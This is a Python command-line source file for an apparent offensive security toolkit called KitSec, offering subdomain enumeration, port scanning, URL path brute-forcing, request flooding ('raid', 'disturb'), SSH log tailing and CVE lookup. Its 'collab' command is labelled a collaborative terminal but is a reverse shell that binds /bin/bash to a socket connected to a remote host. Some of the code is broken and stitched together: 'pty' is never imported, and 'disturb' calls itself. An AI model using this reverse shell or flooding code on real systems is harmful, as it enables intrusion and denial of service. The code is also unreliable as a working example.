import os
import time
import gzip
import socket
import ipwhois
import warnings
import subprocess
import urllib.parse
from typing import List
import hashlib


import requests
import paramiko
import ipaddress
import concurrent
import pandas as pd
from tqdm import tqdm
from bs4 import BeautifulSoup
from tabulate import tabulate
from urllib.parse import urlparse
from Wappalyzer import Wappalyzer, WebPage


import html
import json
import black
import magic
import click
import base64
import platform
import textwrap
import binascii



#break the code into multiple files like kitsetc.utils, kitsec.enumerator, kitsec.recon, kitsec.scanner, kitsec.exploiter, kitsec.fuzzer, kitsec.bruter, kitsec.misc


@click.group()
def cli():
    """
    KitSec - A CLI tool for security testing and reconnaissance.
    """
    pass


@click.command()
@click.option('--host', prompt='Enter the IP address of the VPS server to connect to')
@click.option('--username', prompt='Enter the limited user account to use for connecting to the VPS server')
@click.option('--password', prompt='Enter the password for the user account', hide_input=True)
def vps_logger(host, username, password):
    """
    Connects to a remote VPS server and tails the auth.log file.

    Returns:
    - Prints a continuous stream of output from the auth.log file to the console.

    The program attempts to connect to the specified VPS server using SSH, with the provided
    username and password. Once connected, it invokes a shell and sends the command to tail
    the auth.log file using sudo. It then continuously checks for new output from the file and
    prints it to the console as it is received.
    """
    # Create an SSH client object and set the missing host key policy to auto add
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Connect to the VPS server using the provided host, username, and password
    ssh.connect(host, username=username, password=password)
    
    # Invoke a shell and send the command to tail the auth.log file using sudo
    channel = ssh.invoke_shell()
    channel.send('sudo tail -f /var/log/auth.log\n')
    
    # Continuously check for new output from the auth.log file and print it to the console
    while True:
        if channel.recv_ready():
            output = channel.recv(1024).decode('utf-8')
            click.echo(output, nl=False)



@click.command()
@click.argument('host')
@click.argument('port')
def collab(host, port):
    """
    Connects to a remote machine and starts a collaborative terminal.

    Args:
    - host (str): The IP address or hostname of the remote machine.
    - port (int): The port to connect to on the remote machine.

    Returns:
    - None. Starts a collaborative terminal session with the remote machine.

    The program attempts to connect to the specified remote machine on the specified port.
    If the connection is successful, it starts a new terminal session that is shared between
    the local machine and the remote machine. All input and output is echoed to both machines.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))
        click.echo(f'Connected to {host}:{port}.')

        pty.spawn(['/bin/bash'], stdin=sock, stdout=sock, stderr=sock)

        click.echo('Terminal closed.')
    except socket.error as e:
        click.echo(f'Error connecting to {host}:{port}: {e}')



import click
from network import capture_request

@click.command()
@click.argument('url')
def capture(url):
    """
    Captures the request headers for a given URL.
    """
    capture_request(url)



import click
import sys
from utils import apply_transformation

@click.command()
@click.argument('data')
@click.option('--type', '-t', 'transformation_type', type=click.Choice(['URL', 'HTML', 'Base64', 'ASCII', 'Hex', 'Octal', 'Binary', 'MD5', 'SHA1', 'SHA256', 'BLAKE2B-160', 'GZIP']), default='Base64')
def convert(data, transformation_type):
    """
    Applies a specified decoding or hashing function to input data.
    """
    try:
        result = apply_transformation(data.encode('utf-8'), transformation_type)
    except Exception as e:
        click.echo(f"Error: {str(e)}")
        sys.exit(1)

    click.echo(result)


from enumerator import full_enumerator

@click.command()
@click.option('--request', '-r', is_flag=True, default=False, help='Test subdomains and print http response for active ones.')
@click.option('--technology', '-t', is_flag=True, default=False, help='Analyze technology used by subdomains.')
@click.option('--active', '-a', is_flag=True, default=False, help='Use active enumeration.')
@click.argument('domain')
def enumerator(request, technology, active, domain):
    """Enumerate subdomains for a given domain."""
    full_enumerator(request=request, technology=technology, active=active, domain=domain)


import click
from network import apply_disturb

@click.command()
@click.argument('url', required=True)
@click.option('-m', '--method', default='GET', help='HTTP method to use')
@click.option('-p', '--payload', default='', help='Payload to include in the request body')
@click.option('-H', '--headers', default='', help='Headers to include in the request')
@click.option('-c', '--cookies', default='', help='Cookies to include in the request')
@click.option('-n', '--count', default=1, type=int, help='Number of times to repeat the request')
def disturb(url, method, payload, headers, cookies, count):
    """
    Sends multiple HTTP requests to the specified URL with the same payload.
    """
    responses = disturb(url, method, payload, headers, cookies, count)
    for i, response in enumerate(responses):
        click.echo(f'Response {i + 1}: {response.status_code} - {response.reason}')



from network import apply_raid

@click.command()
@click.argument('url', type=str)
@click.option('--num-threats', '-t', type=int, default=6, help='Number of parallel threats to send requests from.')
@click.option('--num-requests', '-r', type=int, default=200, help='Number of requests to send from each threat.')
@click.option('--num-retries', '-y', type=int, default=4, help='Number of times to retry failed requests.')
@click.option('--pause-before-retry', '-p', type=int, default=3000, help='Number of milliseconds to wait before retrying a failed request.')
def raid(url, num_threats, num_requests, num_retries, pause_before_retry):
    """
    Sends HTTP requests to a given URL with a specified number of threats and requests.
    """
    results = apply_raid(url, num_threats, num_requests, num_retries, pause_before_retry)
    click.echo(results)



import click
from network import scan_ports

@click.command()
@click.argument('url')
@click.option('-c', '--common-ports', is_flag=True, help='Scan only the most common HTTP ports (80, 8080, and 443)')
def portscan(url, common_ports):
    """
    Performs a TCP port scan on a specified hostname or URL and a range of ports.
    """
    scan_ports(url, common_ports)


@click.command()
@click.argument('base_url')
@click.option('-p', '--path', default='../lists/injector', help='The path to a file or directory containing a list of paths to send requests to. Default: ../lists/injector')
def inject(base_url, path):
    """
    Sends HTTP GET requests to a specified base URL with a given list of paths.

    Args:
    - base_url (str): The base URL to send requests to. The URL must include the protocol (http or https).

    Options:
    - path (str): The path to a file or directory containing a list of paths to send requests to. Default: ../lists/injector

    Returns:
    - None. For each request sent, the program will print the URL and response code to the console if the response code is 200.
    """

    # Add http or https prefix if missing
    if not base_url.startswith('http'):
        base_url = 'http://' + base_url

    # Check if the path is a directory or a file
    if os.path.isdir(path):
        # If the path is a directory, iterate through each file in the directory
        for filename in os.listdir(path):
            filepath = os.path.join(path, filename)
            if os.path.isfile(filepath):
                # If the file is a regular file, read each line in the file and send a request to the URL
                with open(filepath) as f:
                    paths = f.read().splitlines()
                    progress_bar = tqdm(paths, desc=os.path.splitext(filename)[0], position=0, leave=True)
                    for p in progress_bar:
                        url = f"{base_url}/{p}"
                        response = requests.get(url)
                        # If the response code is 200, print the URL and response code to the console
                        if response.status_code == 200:
                            click.echo(f"{url} - {response.status_code}")
    elif os.path.isfile(path):
        # If the path is a regular file, read each line in the file and send a request to the URL
        with open(path) as f:
            paths = f.read().splitlines()
            progress_bar = tqdm(paths, desc=os.path.basename(path), position=0, leave=True)
            for p in progress_bar:
                url = f"{base_url}/{p}"
                response = requests.get(url)
                # If the response code is 200, print the URL and response code to the console
                if response.status_code == 200:
                    click.echo(f"{url} - {response.status_code}")
    else:
        # If the path does not exist, print an error message to the console
        click.echo(f"{path} does not exist")




def fetch_cwe(cwe_code):
    """Fetches the CWE name given a CWE code.

    :param cwe_code: The CWE code to fetch the name for.
    :type cwe_code: str
    :return: The name of the CWE.
    :rtype: str
    """
    # Construct the URL for the CWE code
    cwe_url = f"https://cwe.mitre.org/data/definitions/{cwe_code[4:].lower()}.html"

    # Send a GET request to the URL and parse the HTML response with BeautifulSoup
    response = requests.get(cwe_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract the CWE name from the page title
    cwe_title = soup.find('title').text.strip()
    cwe_name = cwe_title.split(':')[1].strip()

    # Return the CWE code and name as a formatted string
    return f"{cwe_code}: {cwe_name}"



@click.command()
@click.argument('product_name')
@click.option('--limit', '-l', type=int, default=10, help='Number of results to display (default=10)')
def cve(product_name, limit):
    """
    Retrieve CVE data for a specific product name (company name) and display it in a clean format.

    Args:
    - product_name (str): The product name (company name) to search for.

    Options:
    - limit (int): Number of results to display (default=10).

    Returns:
    - None. Prints the retrieved CVE data in a table format.
    """
    # Make request to the NVD API and extract relevant fields
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={product_name}&resultsPerPage={limit}"
    response = requests.get(url)
    data = response.json()
    cve_items = data.get("result", {}).get("CVE_Items", [])

    # Prepare the data to be displayed in a table format
    table_data = []
    for item in cve_items:
        # Extract CVE ID, severity, and summary fields
        cve_id = item.get("cve", {}).get("CVE_data_meta", {}).get("ID")
        severity = item.get("impact", {}).get("baseSeverity", "Unknown")
        if severity == "Unknown":
            severity_msg = "Severity information not available"
        else:
            severity_msg = severity
        summary = item.get("cve", {}).get("description", {}).get("description_data", [])
        summary = next((x.get("value") for x in summary if x.get("lang") == "en"), "")

        # Extract CWE information and append it to the data
        cwe_nodes = item.get("cve", {}).get("problemtype", {}).get("problemtype_data", [])
        cwe_codes = [n.get("description", [{}])[0].get("value", "") for n in cwe_nodes if n.get("description")]
        for cwe_code in cwe_codes:
            cwe_name = fetch_cwe(cwe_code)
            table_data.append(["CVE ID", cve_id])
            table_data.append(["CWE", cwe_name])
            table_data.append(["Severity", severity_msg])
            table_data.append(["Summary", summary])
            table_data.append(["", ""])  # Add an empty row for spacing
    
    # Display the data in a table format
    headers = ["", ""]
    click.echo(tabulate(table_data, headers=headers, tablefmt="plain"))



@click.command()
@click.argument('company_name')
def cidr(company_name):
    """
    Look up the CIDR range for a company's domain name.
    """
    try:
        # Look up the IP address for the company's domain name
        ip_address = socket.gethostbyname(company_name)

        # Look up the RDAP record for the IP address
        rdap_record = ipwhois.IPWhois(ip_address).lookup_rdap()

        # Extract the CIDR range from the RDAP record
        cidr_range = rdap_record['network']['cidr']

        click.echo(f"The CIDR range for {company_name} is {cidr_range}")

    except Exception as e:
        click.echo(f"Error: {str(e)}")


cli.add_command(vps_logger)
cli.add_command(collab)
cli.add_command(capture)
cli.add_command(convert)
cli.add_command(enumerator)
cli.add_command(disturb)
cli.add_command(raid)
cli.add_command(portscan)
cli.add_command(inject)
cli.add_command(cve)
cli.add_command(cidr)


if __name__ == '__main__':
    cli()